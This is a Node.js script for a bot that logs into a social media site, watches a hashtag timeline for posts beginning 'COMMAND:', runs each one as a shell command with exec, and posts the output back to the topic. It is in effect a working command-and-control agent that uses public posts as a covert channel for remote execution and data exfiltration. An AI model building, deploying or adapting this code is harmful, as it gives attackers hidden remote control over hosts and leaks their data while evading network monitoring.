require('dotenv').config();
const path = require('path');
const { exec } = require('child_process');

const { login, acceptCookies } = require('./lib/login.js');
const Commands = require('./lib/commands.js');
const { log, sleep } = require('../utils/utils.js');
const { URLS, COMMANDS, COMMUNICATION } = require('../config/constants.js');
const MESSAGES = require('../config/messages.js');

USER = process.env.BOT_EMAIL;
PASS = process.env.BOT_PASSWORD;
VERIFICATION = process.env.BOT_VERIFICATION;
BROWSER = process.env.BROWSER;
HEADLESS = process.env.HEADLESS == "true" ? "new" : false;
TOPIC = process.env.TOPIC;

const nextAction = () => {
	log(MESSAGES.EMPTY);
	sleep(COMMANDS.DELAY);
}

async function waitForCommand(commands) {
	console.log(MESSAGES.COMMAND_WAITING);
	commands.page.goto(`${URLS.TOPIC.format(TOPIC)}?f=live`, { waitUntil: 'networkidle2' });

	const latest = await commands.getTimelinePost(1);
	if (!latest) {
		waitForCommand(commands);
		return;
	}

	let content = await commands.getPostContent(latest);

	content = content.replace(`#${TOPIC}`, "").trim();

	if (content.startsWith("COMMAND:")) {
		const command = content.replace("COMMAND:", "").trim().split("[")[0];
		log(MESSAGES.COMMAND_RECEIVED.format(command));

		// Execute the command and wait for it to complete
		let { stdout, stderr } = await executeCommand(command);

		if (stderr) {
			log(stderr);
		}

		log(stdout);
		stdout = "OUTPUT: " + stdout + `[${Date.now()}]`;
		await commands.makePost(stdout, [`#${TOPIC}`]);

		// Continue waiting for the next command
		await waitForCommand(commands);
	} else {
		// If no command is found, wait for 5 seconds and then check again
		setTimeout(() => waitForCommand(commands), COMMUNICATION.CHECK_INTERVAL);
	}
}

async function executeCommand(command) {
	return new Promise((resolve) => {
		exec(command, (err, stdout, stderr) => {
			resolve({ stdout, stderr });
		});
	});
}


// run bot
(async () => {
	log(MESSAGES.STARTING.format(path.basename(__filename).replace(".js", "")));

	const page = await login(USER, PASS, VERIFICATION, URLS.LOGIN, BROWSER, HEADLESS);
	nextAction();
	await acceptCookies(page);
	nextAction();

	const commands = new Commands(page);

	// open communication channel and pass timestamp
	await commands.makePost(`${COMMUNICATION.OPEN} [${Date.now()}]`, [`#${TOPIC}`]);
	nextAction();

	// wait for command from commander
	waitForCommand(commands);
})();